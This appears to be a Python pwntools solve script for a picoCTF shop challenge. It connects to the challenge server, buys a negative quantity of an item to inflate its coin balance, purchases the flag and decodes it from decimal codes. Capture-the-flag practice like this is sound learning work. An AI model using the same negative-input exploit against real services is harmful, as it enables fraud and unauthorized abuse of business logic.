#!/usr/bin/env python
from pwn import remote, context
from icecream import ic
import re

ic.disable()
context.log_level = "warn"

url, port = "mercury.picoctf.net", 11371

r = remote(url, port)

# Buy negative amounts of an option
ic(r.recvline_startswith(b"Choose an option: "))
r.sendline(b"0")
ic(r.recvline())
r.sendline(b"-6")

# Buy the flag now that we have 100 coins
ic(r.recvline_startswith(b"Choose an option: "))
r.sendline(b"2")
ic(r.recvline())
r.sendline(b"1")

# Decode the flag
flag_response = ic(r.recvline().decode())
flag: str = ic(re.findall(r'(\[.*\])', flag_response)
               [0].replace("[", "").replace("]", ""))
# Convert dec to ASCII
flag = "".join(map(chr, map(int, flag.split(" "))))
print(flag)
